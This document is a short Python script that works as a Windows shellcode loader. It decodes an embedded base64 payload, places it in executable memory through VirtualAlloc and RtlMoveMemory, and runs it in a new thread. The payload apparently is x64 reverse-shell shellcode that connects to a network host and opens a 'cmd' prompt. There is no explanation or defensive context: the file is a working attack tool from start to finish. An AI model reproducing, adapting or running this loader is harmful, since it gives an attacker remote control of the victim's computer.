import ctypes
import base64

shellcode_base64 = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnl
SbwCAAG7CgACD0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInC
SP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBI
ieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6
ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlB
idr/1Q=="""

shellcode = base64.b64decode(shellcode_base64)

ptr = ctypes.windll.kernel32.VirtualAlloc(
    None,
    len(shellcode),
    0x3000,  # MEM_COMMIT | MEM_RESERVE
    0x40     # PAGE_EXECUTE_READWRITE
)

ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_void_p(ptr),
    shellcode,
    len(shellcode)
)

handle = ctypes.windll.kernel32.CreateThread(
    None,
    0,
    ptr,
    None,
    0,
    None
)

ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
